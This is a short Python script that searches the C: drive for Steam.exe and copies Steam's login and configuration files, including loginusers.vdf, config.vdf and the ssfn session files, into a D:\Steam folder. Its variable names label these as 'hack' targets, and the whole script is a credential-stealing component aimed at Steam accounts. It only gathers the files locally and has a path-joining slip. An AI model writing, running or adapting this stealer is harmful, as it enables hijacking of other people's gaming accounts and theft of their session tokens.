import os
import shutil


def main():
    basepath = "C:\\"
    file_steam = 'Steam.exe'
    hack_folder_steam = 'config'
    hack_file_steam = ['config.vdf', 'loginusers.vdf', 'steamapps.vrmanifest']
    parth_name_steam = 'ssfn'
    folder_write_steam = "D:\\Steam"
    exit = False

    walk = os.walk(basepath)
    for dirpath, dirnames, files in walk:
        for file_name in files:
            if file_name == file_steam:
                print(dirpath)
                path = dirpath + "\\" + hack_folder_steam
                path2 = dirpath
                print(path)
                os.makedirs(folder_write_steam)
                for name in hack_file_steam:
                    shutil.copyfile(path + "\\" + name, folder_write_steam + name)
                with os.scandir(path2) as it:
                    for entry in it:
                        if (entry.is_file()) and (parth_name_steam in entry.name):
                            shutil.copyfile(path2 + "\\" + entry.name, folder_write_steam + entry.name)
                exit = True
                break
        if exit:
            break
    print('OK')


if __name__ == '__main__':
    main()
